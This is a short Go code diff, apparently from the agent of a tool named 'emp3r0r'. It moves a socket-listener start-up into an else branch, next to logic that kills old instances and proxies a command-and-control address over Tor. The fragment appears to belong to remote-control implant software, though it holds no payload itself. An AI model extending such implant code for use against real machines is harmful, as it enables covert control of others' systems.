@@ -255,10 +255,10 @@ test_agent:
 				log.Println("Failed to kill old emp3r0r", err)
 			}
 		}
+	} else {
+		// start socket listener
+		go socketListen()
 	}
-
-	// start socket listener
-	go socketListen()
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
